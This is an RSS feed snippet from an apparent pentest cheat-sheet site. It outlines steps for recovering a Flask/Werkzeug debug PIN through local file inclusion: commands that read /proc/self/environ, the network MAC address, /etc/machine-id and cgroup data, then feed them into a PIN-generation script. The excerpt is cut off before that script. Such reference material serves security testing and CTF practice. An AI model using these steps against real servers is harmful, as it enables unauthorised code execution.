channel.title: Local File Inclusion on TLDRBins
channel.description: Recent content in Local File Inclusion on TLDRBins

item.title: Retrieve Flask Debug Pin
item.description: Retrieve Flask Debug Pin 1. Get user cat /proc/self/environ | grep -aE ('USER'|'LOGNAME') 2. Get full path of the application +------------------------------+ | Get from Traceback debug log | +------------------------------+ 3. Get MAC address cat /sys/class/net/eth0/address # Convert to int python3 -c "print(int('<MAC_ADDRESS>'.replace(':',''), 16))" 4. Create Machine ID String echo $(cat /etc/machine-id)$(head -n 1 /proc/self/cgroup | rev | cut -d '/' -f1 | rev) 5. Update public and private bits in Hacktrick’s Script #!
